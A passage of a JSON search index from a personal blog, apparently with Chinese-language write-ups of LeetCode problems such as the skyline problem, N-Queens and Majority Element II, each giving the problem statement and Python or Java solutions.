sort\u003c/li\u003e\n\u003cli\u003e在python用\u003ccode\u003e[0]*n\u003c/code\u003e通常下場都不好，要改用dict\u003c/li\u003e\n\u003cli\u003esort還是比較厲害\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-164 - Maximum Gap"},{"content":"動機 是誰想到用bit去統計的\nProblem Given an integer array nums where every element appears three times except for one, which appears exactly once. Find the single element and return it.\nYou must implement a solution with a linear runtime complexity and use only constant extra space.\nExample 1:\nInput: nums = [2,2,3,2]Output: 3Example 2:\nInput: nums = [0,1,0,1,0,1,99]Output: 99 Constraints:\n1 \u003c= nums.length \u003c= 3 * 104-231 \u003c= nums[i] \u003c= 231 - 1Each element in nums appears exactly three times except for one element which appears once. Sol 記下每位位元的1出現幾次，如果到了三次就要把前面的劃掉\nclass Solution: def singleNumber(self, nums: List[int]) -\u0026gt; int: one = two = three = 0 for n in nums: two = two | (one \u0026amp; n) one = one ^ n three = one \u0026amp; two one = one \u0026amp; ~three two = two \u0026amp; ~three return one ","permalink":"https://littlebees.github.io/2021/07/leetcode-137-single-number-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e是誰想到用bit去統計的\u003c/p\u003e","title":"leetcode-137 - Single Number II"},{"content":"動機 太偏門了吧\nProblem Given an integer array of size n, find all elements that appear more than ⌊ n/3 ⌋ times.\nFollow-up: Could you solve the problem in linear time and in O(1) space?\nExample 1:\nInput: nums = [3,2,3]Output: [3]Example 2:\nInput: nums = [1]Output: [1]Example 3:\nInput: nums = [1,2]Output: [1,2] Constraints:\n1 \u003c= nums.length \u003c= 5 * 104-109 \u003c= nums[i] \u003c= 109 Sol 看看資料規模，先暴力\nclass Solution: def majorityElement(self, nums: List[int]) -\u0026gt; List[int]: return [k for (k,v) in filter(lambda kv: kv[1] \u0026gt; len(nums)//3, Counter(nums).items())] 題目有一個條件，數字個數大於n/3個\n那這個數字最多幾種?\nn/3 \u0026lt;= x n \u0026lt;= 3x # 如果有三個這種數字，就會超過n 所以最多兩個，之後要在O(n)中常數記憶體找最多數就是Moore vote\nclass Solution: def majorityElement(self, nums: List[int]) -\u0026gt; List[int]: rets = [0]*2 cnts = [0]*2 for n in nums: if rets[0] == n: cnts[0] += 1 elif rets[1] == n: cnts[1] += 1 elif cnts[0] == 0: rets[0] = n cnts[0] = 1 elif cnts[1] == 0: rets[1] = n cnts[1] = 1 else: cnts[0] -= 1 cnts[1] -= 1 cnts = [0]*2 for n in nums: if rets[0] == n: cnts[0] += 1 elif rets[1] == n: cnts[1] += 1 ret = [] [ret.append(rets[i]) for i in range(2) if cnts[i] \u0026gt; len(nums)//3] return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-229-majority-element-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e太偏門了吧\u003c/p\u003e","title":"leetcode-229 - Majority Element II"},{"content":"動機 很玄，這沒看解答會知道?\nProblem An array nums of length n is beautiful if:\nnums is a permutation of the integers in the range [1, n].For every 0 \u003c= i \u003c j \u003c n, there is no index k with i \u003c k \u003c j where 2 * nums[k] == nums[i] + nums[j].Given the integer n, return any beautiful array nums of length n. There will be at least one valid answer for the given n.\nExample 1:\nInput: n = 4Output: [2,1,4,3]Example 2:\nInput: n = 5Output: [3,1,2,5,4] Constraints:\n1 \u003c= n \u003c= 1000 Sol beautiful的array，同時乘2或是同時減1都是beautiful\n奇數加偶數一定是奇數\n所以要從原本的array生奇數版與偶數版之後合起來，但要注意不能超過n\n[1] [2,1] or [1,2] [3,1,2] or [2,1,3] [2,1,4,3] [3,1,2,5,4] class Solution: def beautifulArray(self, n: int) -\u0026gt; List[int]: ret = [1] while len(ret) \u0026lt; n: ret = [x*2-1 for x in ret if x*2-1 \u0026lt;= n] + [x*2 for x in ret if x*2 \u0026lt;= n] return ret[:n] ","permalink":"https://littlebees.github.io/2021/07/leetcode-932-beautiful-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很玄，這沒看解答會知道?\u003c/p\u003e","title":"leetcode-932 - Beautiful Array"},{"content":"動機 雖說是水題，但有用到一個python特點\nProblem You are given a sorted unique integer array nums.\nReturn the smallest sorted list of ranges that cover all the numbers in the array exactly. That is, each element of nums is covered by exactly one of the ranges, and there is no integer x such that x is in one of the ranges but not in nums.\nEach range [a,b] in the list should be output as:\na-\u003eb if a != ba if a == b Example 1:\nInput: nums = [0,1,2,4,5,7]Output: [0-\u003e2,4-\u003e5,7]Explanation: The ranges are:[0,2] --\u003e 0-\u003e2[4,5] --\u003e 4-\u003e5[7,7] --\u003e 7Example 2:\nInput: nums = [0,2,3,4,6,8,9]Output: [0,2-\u003e4,6,8-\u003e9]Explanation: The ranges are:[0,0] --\u003e 0[2,4] --\u003e 2-\u003e4[6,6] --\u003e 6[8,9] --\u003e 8-\u003e9Example 3:\nInput: nums = []Output: []Example 4:\nInput: nums = [-1]Output: [-1]Example 5:\nInput: nums = [0]Output: [0] Constraints:\n0 \u003c= nums.length \u003c= 20-231 \u003c= nums[i] \u003c= 231 - 1All the values of nums are unique.nums is sorted in ascending order. Sol forloop的b會蓋到原本的b!!\nclass Solution: def summaryRanges(self, nums: List[int]) -\u0026gt; List[str]: if not nums: return [] ret = [] a,b = 0,0 for b in range(1,len(nums)): if nums[b-1]+1 != nums[b]: if a != b-1: ret.append(f\u0026#39;{nums[a]}-\u0026gt;{nums[b-1]}\u0026#39;) else: ret.append(f\u0026#39;{nums[a]}\u0026#39;) a = b if a != b: ret.append(f\u0026#39;{nums[a]}-\u0026gt;{nums[b]}\u0026#39;) else: ret.append(f\u0026#39;{nums[a]}\u0026#39;) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-228-summary-ranges/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e雖說是水題，但有用到一個python特點\u003c/p\u003e","title":"leetcode-228 - Summary Ranges"},{"content":"動機 找最短路徑，bfs 但是沒想到最後死在判別重複上\nProblem Given an n x n binary matrix grid, return the length of the shortest clear path in the matrix. If there is no clear path, return -1.\nA clear path in a binary matrix is a path from the top-left cell (i.e., (0, 0)) to the bottom-right cell (i.e., (n - 1, n - 1)) such that:\nAll the visited cells of the path are 0.All the adjacent cells of the path are 8-directionally connected (i.e., they are different and they share an edge or a corner).The length of a clear path is the number of visited cells of this path.\nExample 1:\nInput: grid = [[0,1],[1,0]]Output: 2Example 2:\nInput: grid = [[0,0,0],[1,1,0],[1,1,0]]Output: 4Example 3:\nInput: grid = [[1,0,0],[1,1,0],[1,1,0]]Output: -1 Constraints:\nn == grid.lengthn == grid[i].length1 \u003c= n \u003c= 100grid[i][j] is 0 or 1 Sol 用set直接超時，如果把看過得改成1就直接過了\nclass Solution: def shortestPathBinaryMatrix(self, grid: List[List[int]]) -\u0026gt; int: if grid[0][0] == 1 or grid[-1][-1] == 1: return -1 else: q = deque([[(0,0), 1]]) goal = (len(grid)-1, len(grid[0])-1) while q: (i,j), ret = q.popleft() if (i,j) == goal: return ret else: dirs = [(i+1,j),(i,j+1),(i-1,j),(i,j-1),(i+1,j+1),(i+1,j-1),(i-1,j-1),(i-1,j+1)] dirs = [(x,y) for (x,y) in dirs if 0 \u0026lt;= x \u0026lt; len(grid) and 0 \u0026lt;= y \u0026lt; len(grid[i]) and grid[x][y] == 0] for (x,y) in dirs: grid[x][y] = 1 q.append([(x,y), ret+1]) return -1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-1091-shortest-path-in-binary-matrix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e找最短路徑，bfs\n但是沒想到最後死在判別重複上\u003c/p\u003e","title":"leetcode-1091 - Shortest Path in Binary Matrix"},{"content":"動機 被這題搞了兩天，所以要記錄下來 以前沒有看線段合併的Divide and Conquer，所以要記錄下來 (還債) 以前沒有看Segment tree，所以要記錄下來 (還債)\nProblem A city's skyline is the outer contour of the silhouette formed by all the buildings in that city when viewed from a distance. Given the locations and heights of all the buildings, return the skyline formed by these buildings collectively.\nThe geometric information of each building is given in the array buildings where buildings[i] = [lefti, righti, heighti]:\nlefti is the x coordinate of the left edge of the ith building.righti is the x coordinate of the right edge of the ith building.heighti is the height of the ith building.You may assume all buildings are perfect rectangles grounded on an absolutely flat surface at height 0.\nThe skyline should be represented as a list of key points sorted by their x-coordinate in the form [[x1,y1],[x2,y2],...]. Each key point is the left endpoint of some horizontal segment in the skyline except the last point in the list, which always has a y-coordinate 0 and is used to mark the skyline's termination where the rightmost building ends. Any ground between the leftmost and rightmost buildings should be part of the skyline's contour.\nNote: There must be no consecutive horizontal lines of equal height in the output skyline. For instance, [...,[2 3],[4 5],[7 5],[11 5],[12 7],...] is not acceptable; the three lines of height 5 should be merged into one in the final output as such: [...,[2 3],[4 5],[12 7],...]\nExample 1:\nInput: buildings = [[2,9,10],[3,7,15],[5,12,12],[15,20,10],[19,24,8]]Output: [[2,10],[3,15],[7,12],[12,0],[15,10],[20,8],[24,0]]Explanation:Figure A shows the buildings of the input.Figure B shows the skyline formed by those buildings. The red points in figure B represent the key points in the output list.Example 2:\nInput: buildings = [[0,2,3],[2,5,3]]Output: [[0,3],[5,0]] Constraints:\n1 \u003c= buildings.length \u003c= 1040 \u003c= lefti \u003c righti \u003c= 231 - 11 \u003c= heighti \u003c= 231 - 1buildings is sorted by lefti in non-decreasing order. Ver1: Stack (many WA) def retAppend(ret,p): #if not ret or ret[-1][1] != p[1]: ret.append(p) def fg(stk,ret,b): # (stk,b) -\u0026gt; stk,ret print(b) print(ret,stk) if not stk: retAppend(ret,[b[0],b[2]]) # raise stk.append(b) return [stk,ret] else: now = stk[-1] if b[0] == now[0] and b[1] == now[1]: # same seg if b[2] \u0026gt; now[2]: stk.pop() stk.append(b) return [stk,ret] else: return [stk,ret] elif b[0] \u0026lt; now[1] and b[1] \u0026lt;= now[1]: # whole seg in roof if b[2] \u0026gt; now[2]: retAppend(ret,[b[0],b[2]]) # raise a = stk.pop() stk.append([b[1],a[1],a[2]]) stk.append(b) return [stk,ret] else: return [stk,ret] elif b[0] \u0026lt; now[1] and now[1] \u0026lt; b[1]: # part of seg in roof if b[2] \u0026gt; now[2]: retAppend(ret,[b[0],b[2]]) stk.pop() stk.append(b) return [stk,ret] elif b[2] == now[2]: tmp = stk.pop() stk.append([tmp[0],b[1],b[2]]) return [stk,ret] else: tmp = stk.pop() a = [tmp[1],b[1],b[2]] return fg(stk,ret,a) elif b[0] == now[1]: # touch print(now,b,[now[1],now[2]]) if b[2] \u0026gt; now[2]: retAppend(ret,[b[0],b[2]]) # raise elif b[2] \u0026lt; now[2]: retAppend(ret,[now[1],b[2]]) # fall stk.pop() stk.append(b) return [stk,ret] else: # seperate tmp = stk.pop() retAppend(ret,[tmp[1],0 if not stk else stk[-1][2]]) # fall return fg(stk,ret,b) class Solution: def getSkyline(self, bs: List[List[int]]) -\u0026gt; List[List[int]]: if not bs: return [] stk = [] ret = [] bs.sort(key=lambda b: (b[0],-b[2],b[1])) #print(bs) for b in bs: stk, ret = fg(stk,ret,b) retAppend(ret,[stk[-1][1],0]) return ret Ver2: Divide and Conquer (AC) def div(bs,i,j): if i == j: return [[bs[i][0],bs[i][2]], [bs[i][1],0]] else: mid = (j+i)//2 return merge(div(bs,i,mid), div(bs,mid+1,j)) def merge(a,b): ret = [] i = 0 j = 0 h = 0 h1 = 0 h2 = 0 while i \u0026lt; len(a) or j \u0026lt; len(b): if i \u0026lt; len(a) and j \u0026lt; len(b): cur = None if a[i][0] \u0026lt; b[j][0]: cur = a[i][0] h1 = a[i][1] i+=1 elif a[i][0] \u0026gt; b[j][0]: cur = b[j][0] h2 = b[j][1] j+=1 else: cur = b[j][0] h1 = a[i][1] h2 = b[j][1] i += 1 j += 1 h = max(h1,h2) if not ret or ret[-1][1] != h: ret.append([cur, h]) elif i \u0026lt; len(a): ret += a[i:] break else: ret += b[j:] break return ret class Solution: def getSkyline(self, bs: List[List[int]]) -\u0026gt; List[List[int]]: if not bs: return [] else: return div(bs,0,len(bs)-1) Ver3: heap \u0026amp; Sweep Line (AC) from heapq import * def f(poses): hq = [] ret = [] for p in poses: if not hq or p[1] \u0026lt; 0: # start seg heappush(hq,p[1]) else: # end seg hq.pop(hq.index(-p[1])) heapify(hq) if not hq: ret.append([p[0],0]) else: if not ret: ret.append([p[0],-hq[0]]) else: if ret[-1][0] == p[0] and p[1] \u0026lt; 0: # tete if ret[-1][1] \u0026lt; -p[1]: ret[-1][1] = -p[1] else: if ret[-1][1] != -hq[0]: # height changed ret.append([p[0],-hq[0]]) else: pass return ret class Solution: def getSkyline(self, bs: List[List[int]]) -\u0026gt; List[List[int]]: if not bs: return [] else: poses = [] for b in bs: poses.append([b[0],-b[2]]) poses.append([b[1],b[2]]) poses.sort(key= lambda p: (p[0],p[1])) return f(poses) from sortedcontainers import SortedList def f(poses): hq = SortedList() ret = [] for p in poses: if not hq or p[1] \u0026lt; 0: # start seg hq.add(p[1]) else: # end seg del hq[hq.bisect_left(-p[1])] if not hq: ret.append([p[0],0]) else: if not ret: ret.append([p[0],-hq[0]]) else: if ret[-1][0] == p[0] and p[1] \u0026lt; 0: # tete if ret[-1][1] \u0026lt; -p[1]: ret[-1][1] = -p[1] else: if ret[-1][1] != -hq[0]: # height changed ret.append([p[0],-hq[0]]) else: pass return ret class Solution: def getSkyline(self, bs: List[List[int]]) -\u0026gt; List[List[int]]: if not bs: return [] else: poses = [] for b in bs: poses.append([b[0],-b[2]]) poses.append([b[1],b[2]]) poses.sort(key= lambda p: (p[0],p[1])) return f(poses) Ref [翻译]扫描线算法(Line Sweep Algorithm)（1） Chapter9 線段樹與相關結構\n","permalink":"https://littlebees.github.io/2021/07/leetcode-218-the-skyline-problem/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e被這題搞了兩天，所以要記錄下來\n以前沒有看線段合併的Divide and Conquer，所以要記錄下來 (還債)\n以前沒有看Segment tree，所以要記錄下來 (還債)\u003c/p\u003e","title":"leetcode-218 - The Skyline Problem"},{"content":"動機 很喜歡的一題，看到怎麼處理abs\nProblem Given an integer array nums and two integers k and t, return true if there are two distinct indices i and j in the array such that abs(nums[i] - nums[j]) \u003c= t and abs(i - j) \u003c= k.\nExample 1:\nInput: nums = [1,2,3,1], k = 3, t = 0Output: trueExample 2:\nInput: nums = [1,0,1,1], k = 1, t = 2Output: trueExample 3:\nInput: nums = [1,5,9,1,5,9], k = 2, t = 3Output: false Constraints:\n0 \u003c= nums.length \u003c= 2 * 104-231 \u003c= nums[i] \u003c= 231 - 10 \u003c= k \u003c= 1040 \u003c= t \u003c= 231 - 1 Sol index的abs用windows len去限制\n資料的abs要推\nabs(nums[i] - nums[j]) \u0026lt;= t -t \u0026lt;= nums[i] - nums[j] \u0026lt;= t -t-nums[i] \u0026lt;= - nums[j] \u0026lt;= t-nums[i] t+nums[i] \u0026gt;= nums[j] \u0026gt;= nums[i]-t nums[j] \u0026gt;= nums[i]-t 第一個大於等於，lower bound 剩下就是另外檢查\nfrom sortedcontainers import SortedList class Solution: def containsNearbyAlmostDuplicate(self, nums: List[int], k: int, t: int) -\u0026gt; bool: win = SortedList() j=0 for i in range(len(nums)): x = bisect_left(win,nums[i]-t) if x \u0026lt; len(win) and abs(nums[i]-win[x]) \u0026lt;= t: return True # update window win.add(nums[i]) if len(win) \u0026gt; k: win.remove(nums[j]) j += 1 return False ","permalink":"https://littlebees.github.io/2021/07/leetcode-220-contains-duplicate-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很喜歡的一題，看到怎麼處理abs\u003c/p\u003e","title":"leetcode-220 - Contains Duplicate III"},{"content":"動機 要多翻一格\nProblem Design an iterator that supports the peek operation on a list in addition to the hasNext and the next operations.\nImplement the PeekingIterator class:\nPeekingIterator(int[] nums) Initializes the object with the given integer array nums.int next() Returns the next element in the array and moves the pointer to the next element.bool hasNext() Returns true if there are still elements in the array.int peek() Returns the next element in the array without moving the pointer. Example 1:\nInput[PeekingIterator, next, peek, next, next, hasNext][[[1, 2, 3]], [], [], [], [], []]Output[null, 1, 2, 2, 3, false]ExplanationPeekingIterator peekingIterator = new PeekingIterator([1, 2, 3]); // [1,2,3]peekingIterator.next(); // return 1, the pointer moves to the next element [1,2,3].peekingIterator.peek(); // return 2, the pointer does not move [1,2,3].peekingIterator.next(); // return 2, the pointer moves to the next element [1,2,3]peekingIterator.next(); // return 3, the pointer moves to the next element [1,2,3]peekingIterator.hasNext(); // return False Constraints:\n1 \u003c= nums.length \u003c= 10001 \u003c= nums[i] \u003c= 1000All the calls to next and peek are valid.At most 1000 calls will be made to next, hasNext, and peek. Follow up: How would you extend your design to be generic and work with all types, not just integer? Sol class PeekingIterator: def __init__(self, iterator): self.l = iterator self.prev,self.now = None, self.l.next() def peek(self): return self.now def next(self): if self.l.hasNext(): self.prev, self.now = self.now, self.l.next() else: self.prev, self.now = self.now, None return self.prev def hasNext(self): return self.now is not None ","permalink":"https://littlebees.github.io/2021/07/leetcode-284-peeking-iterator/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要多翻一格\u003c/p\u003e","title":"leetcode-284 - Peeking Iterator"},{"content":"動機 直接把後面的空stack拿掉是關鍵\nProblem You have an infinite number of stacks arranged in a row and numbered (left to right) from 0, each of the stacks has the same maximum capacity.\nImplement the DinnerPlates class:\nDinnerPlates(int capacity) Initializes the object with the maximum capacity of the stacks capacity.void push(int val) Pushes the given integer val into the leftmost stack with a size less than capacity.int pop() Returns the value at the top of the rightmost non-empty stack and removes it from that stack, and returns -1 if all the stacks are empty.int popAtStack(int index) Returns the value at the top of the stack with the given index index and removes it from that stack or returns -1 if the stack with that given index is empty. Example 1:\nInput[DinnerPlates, push, push, push, push, push, popAtStack, push, push, popAtStack, popAtStack, pop, pop, pop, pop, pop][[2], [1], [2], [3], [4], [5], [0], [20], [21], [0], [2], [], [], [], [], []]Output[null, null, null, null, null, null, 2, null, null, 20, 21, 5, 4, 3, 1, -1]Explanation: DinnerPlates D = DinnerPlates(2); // Initialize with capacity = 2D.push(1);D.push(2);D.push(3);D.push(4);D.push(5); // The stacks are now: 2 4 1 3 5 ï¹ ï¹ ï¹D.popAtStack(0); // Returns 2. The stacks are now: 4 1 3 5 ï¹ ï¹ ï¹D.push(20); // The stacks are now: 20 4 1 3 5 ï¹ ï¹ ï¹D.push(21); // The stacks are now: 20 4 21 1 3 5 ï¹ ï¹ ï¹D.popAtStack(0); // Returns 20. The stacks are now: 4 21 1 3 5 ï¹ ï¹ ï¹D.popAtStack(2); // Returns 21. The stacks are now: 4 1 3 5 ï¹ ï¹ ï¹ D.pop() // Returns 5. The stacks are now: 4 1 3 ï¹ ï¹ D.pop() // Returns 4. The stacks are now: 1 3 ï¹ ï¹ D.pop() // Returns 3. The stacks are now: 1 ï¹ D.pop() // Returns 1. There are no stacks.D.pop() // Returns -1. There are still no stacks. Constraints:\n1 \u003c= capacity \u003c= 2 * 1041 \u003c= val \u003c= 2 * 1040 \u003c= index \u003c= 105At most 2 * 105 calls will be made to push, pop, and popAtStack. Sol 用一個avail去存可以放的stack，有趣的是在push時要後面的stack空的去掉\nfrom sortedcontainers import SortedList class DinnerPlates: def __init__(self, capacity: int): self.stkCap = capacity self.stks = [] self.avail = SortedList() def push(self, val: int) -\u0026gt; None: if not self.avail: at = len(self.stks) self.avail.add(at) self.stks.append([]) else: at = self.avail[0] self.stks[at].append(val) if len(self.stks[at]) == self.stkCap: self.avail.remove(at) def pop(self) -\u0026gt; int: return self.popAtStack(len(self.stks)-1) def popAtStack(self, i: int) -\u0026gt; int: if 0 \u0026lt;= i \u0026lt; len(self.stks) and self.stks[i]: ret = self.stks[i].pop() if len(self.stks[i]) == self.stkCap-1: self.avail.add(i) while self.stks and not self.stks[-1]: self.stks.pop() self.avail.remove(len(self.stks)) return ret else: return -1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-1172-dinner-plate-stacks/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e直接把後面的空stack拿掉是關鍵\u003c/p\u003e","title":"leetcode-1172 - Dinner Plate Stacks"},{"content":"動機 複習backtrack\nProblem The n-queens puzzle is the problem of placing n queens on an n x n chessboard such that no two queens attack each other.\nGiven an integer n, return all distinct solutions to the n-queens puzzle. You may return the answer in any order.\nEach solution contains a distinct board configuration of the n-queens' placement, where 'Q' and '.' both indicate a queen and an empty space, respectively.\nExample 1:\nInput: n = 4Output: [[.Q..,...Q,Q...,..Q.],[..Q.,Q...,...Q,.Q..]]Explanation: There exist two distinct solutions to the 4-queens puzzle as shown aboveExample 2:\nInput: n = 1Output: [[Q]] Constraints:\n1 \u003c= n \u003c= 9 Sol class Solution: def solveNQueens(self, n: int) -\u0026gt; List[List[str]]: tbl = [] for _ in range(n): tmp = [] for _ in range(n): tmp.append(\u0026#34;.\u0026#34;) tbl.append(tmp) def good(taken, j): return not any([abs(taken[dep] - j) in [0, len(taken)-dep] for dep in range(len(taken))]) ret = [] def bt(i,taken=[]): if i == n: ret.append([\u0026#39;\u0026#39;.join(l) for l in tbl]) else: for x in range(n): tbl[i][x] = \u0026#34;Q\u0026#34; if good(taken, x): bt(i+1, taken+[x]) tbl[i][x] = \u0026#34;.\u0026#34; bt(0) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-51-n-queens/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習backtrack\u003c/p\u003e","title":"leetcode-51 - N-Queens"},{"content":"動機 加加加\nProblem Given two binary strings a and b, return their sum as a binary string.\nExample 1:\nInput: a = 11, b = 1Output: 100Example 2:\nInput: a = 1010, b = 1011Output: 10101 Constraints:\n1 \u003c= a.length, b.length \u003c= 104a and b consist only of '0' or '1' characters.Each string does not contain leading zeros except for the zero itself. Sol 就之前在2用的方法\nclass Solution: def addBinary(self, a: str, b: str) -\u0026gt; str: a,b = [int(n) for n in list(a[::-1])], [int(n) for n in list(b[::-1])] ret,carry = [], 0 while a or b: if a and b: tmp = a[0]+b[0]+carry ret.append(tmp%2) carry = tmp//2 a,b = a[1:],b[1:] elif a: tmp = a[0]+carry ret.append(tmp%2) carry = tmp//2 a = a[1:] else: tmp = b[0]+carry ret.append(tmp%2) carry = tmp//2 b = b[1:] if carry: ret.append(carry) return \u0026#39;\u0026#39;.join([str(n) for n in ret[::-1]]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-67-add-binary/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e加加加\u003c/p\u003e","title":"leetcode-67 - Add Binary"},{"content":"動機 天啊\nProblem Convert a non-negative integer num to its English words representation.\nExample 1:\nInput: num = 123Output: One Hundred Twenty ThreeExample 2:\nInput: num = 12345Output: Twelve Thousand Three Hundred Forty FiveExample 3:\nInput: num = 1234567Output: One Million Two Hundred Thirty Four Thousand Five Hundred Sixty SevenExample 4:\nInput: num = 1234567891Output: One Billion Two Hundred Thirty Four Million Five Hundred Sixty Seven Thousand Eight Hundred Ninety One Constraints:\n0 \u003c= num \u003c= 231 - 1 Sol 先把3位數的function先做出來，之後就是慢慢往上推\nclass Solution: def numberToWords(self, num: int) -\u0026gt; str: v1 = [\u0026#34;\u0026#34;, \u0026#34;One\u0026#34;, \u0026#34;Two\u0026#34;, \u0026#34;Three\u0026#34;, \u0026#34;Four\u0026#34;, \u0026#34;Five\u0026#34;, \u0026#34;Six\u0026#34;, \u0026#34;Seven\u0026#34;, \u0026#34;Eight\u0026#34;, \u0026#34;Nine\u0026#34;, \u0026#34;Ten\u0026#34;, \u0026#34;Eleven\u0026#34;, \u0026#34;Twelve\u0026#34;, \u0026#34;Thirteen\u0026#34;, \u0026#34;Fourteen\u0026#34;, \u0026#34;Fifteen\u0026#34;, \u0026#34;Sixteen\u0026#34;, \u0026#34;Seventeen\u0026#34;, \u0026#34;Eighteen\u0026#34;, \u0026#34;Nineteen\u0026#34;] v2 = [\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Twenty\u0026#34;, \u0026#34;Thirty\u0026#34;, \u0026#34;Forty\u0026#34;, \u0026#34;Fifty\u0026#34;, \u0026#34;Sixty\u0026#34;, \u0026#34;Seventy\u0026#34;, \u0026#34;Eighty\u0026#34;, \u0026#34;Ninety\u0026#34;] v3 = [\u0026#34;Thousand\u0026#34;, \u0026#34;Million\u0026#34;, \u0026#34;Billion\u0026#34;] ret = [] def hund(n): a,b,c = n//100, n%100, n%10 if b \u0026lt; 20: ret = v1[b] elif c \u0026gt; 0: ret = f\u0026#39;{v2[b//10]} {v1[c]}\u0026#39; else: ret = f\u0026#39;{v2[b//10]}\u0026#39; if a \u0026gt; 0: if b \u0026gt; 0: ret = f\u0026#39;{v1[a]} Hundred {ret}\u0026#39; else: ret = f\u0026#39;{v1[a]} Hundred\u0026#39; return ret ret = hund(num%1000) for i in range(3): num = num//1000 if num % 1000 \u0026gt; 0: ret = f\u0026#39;{hund(num%1000)} {v3[i]} {ret}\u0026#39; if ret: if ret[-1] == \u0026#34; \u0026#34;: return ret[:-1] else: return ret else: return \u0026#34;Zero\u0026#34; ","permalink":"https://littlebees.github.io/2021/07/leetcode-273-integer-to-english-words/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e天啊\u003c/p\u003e","title":"leetcode-273 - Integer to English Words"},{"content":"動機 居然用自己的dp過了!!\nProblem A wiggle sequence is a sequence where the differences between successive numbers strictly alternate between positive and negative. The first difference (if one exists) may be either positive or negative. A sequence with one element and a sequence with two non-equal elements are trivially wiggle sequences.\nFor example, [1, 7, 4, 9, 2, 5] is a wiggle sequence because the differences (6, -3, 5, -7, 3) alternate between positive and negative.In contrast, [1, 4, 7, 2, 5] and [1, 7, 4, 5, 5] are not wiggle sequences. The first is not because its first two differences are positive, and the second is not because its last difference is zero.A subsequence is obtained by deleting some elements (possibly zero) from the original sequence, leaving the remaining elements in their original order.\nGiven an integer array nums, return the length of the longest wiggle subsequence of nums.\nExample 1:\nInput: nums = [1,7,4,9,2,5]Output: 6Explanation: The entire sequence is a wiggle sequence with differences (6, -3, 5, -7, 3).Example 2:\nInput: nums = [1,17,5,10,13,15,10,5,16,8]Output: 7Explanation: There are several subsequences that achieve this length.One is [1, 17, 10, 13, 10, 16, 8] with differences (16, -7, 3, -3, 6, -8).Example 3:\nInput: nums = [1,2,3,4,5,6,7,8,9]Output: 2 Constraints:\n1 \u003c= nums.length \u003c= 10000 \u003c= nums[i] \u003c= 1000 Follow up: Could you solve this in O(n) time?\nSol 用mis的思路，不過這裡多要看有沒有wiggle\nWiggle可以是上下或是下上，這裡統一成上下，之後就是根據dp的奇偶性與數字大小做dp\nclass Solution: def wiggleMaxLength(self, nums: List[int]) -\u0026gt; int: dp = 1 if len(nums) == 1: return 1 inc = True for i in range(1,len(nums)): if nums[i-1] != nums[i]: inc = (nums[i-1] \u0026lt; nums[i]) break if not inc: nums = [-x for x in nums] for i in range(1,len(nums)): if nums[i-1] \u0026lt; nums[i]: if dp % 2 == 1: dp += 1 elif nums[i-1] \u0026gt; nums[i]: if dp % 2 == 0: dp += 1 #print(i,dp) return dp 原本的解法是把上下都用成dp，在up或是down時以i為終點的最長長度\npublic class Solution { public int wiggleMaxLength(int[] nums) { if (nums.length \u0026lt; 2) return nums.length; int[] up = new int[nums.length]; int[] down = new int[nums.length]; up[0] = down[0] = 1; for (int i = 1; i \u0026lt; nums.length; i++) { if (nums[i] \u0026gt; nums[i - 1]) { up[i] = down[i - 1] + 1; down[i] = down[i - 1]; } else if (nums[i] \u0026lt; nums[i - 1]) { down[i] = up[i - 1] + 1; up[i] = up[i - 1]; } else { down[i] = down[i - 1]; up[i] = up[i - 1]; } } return Math.max(down[nums.length - 1], up[nums.length - 1]); } } ","permalink":"https://littlebees.github.io/2021/07/leetcode-376-wiggle-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e居然用自己的dp過了!!\u003c/p\u003e","title":"leetcode-376 - Wiggle Subsequence"},{"content":"動機 與140很像\nProblem Given an array of strings words (without duplicates), return all the concatenated words in the given list of words.\nA concatenated word is defined as a string that is comprised entirely of at least two shorter words in the given array.\nExample 1:\nInput: words = [cat,cats,catsdogcats,dog,dogcatsdog,hippopotamuses,rat,ratcatdogcat]Output: [catsdogcats,dogcatsdog,ratcatdogcat]Explanation: catsdogcats can be concatenated by cats, dog and cats; dogcatsdog can be concatenated by dog, cats and dog; ratcatdogcat can be concatenated by rat, cat, dog and cat.Example 2:\nInput: words = [cat,dog,catdog]Output: [catdog] Constraints:\n1 \u003c= words.length \u003c= 1040 \u003c= words[i].length \u003c= 1000words[i] consists of only lowercase English letters.0 \u003c= sum(words[i].length) \u003c= 105 Sol 都是用dfs去try每個分割點，不過這次的word set要自己造\n之後就是dfs去割，割到最後就是有\nclass Solution: def dfs(self,s): if not s: return True for i in range(1,len(s)): if s[:i] in self.seen and (s[i:] in self.seen or self.dfs(s[i:])): return True return False def findAllConcatenatedWordsInADict(self, words: List[str]) -\u0026gt; List[str]: self.seen = set(words) self.words = words ret = [] for w in words: if w: if self.dfs(w): ret.append(w) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-472-concatenated-words/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e與\u003ca href=\"/2021/07/leetcode-140\"\u003e140\u003c/a\u003e很像\u003c/p\u003e","title":"leetcode-472 - Concatenated Words"},{"content":"動機 照著做\nProblem 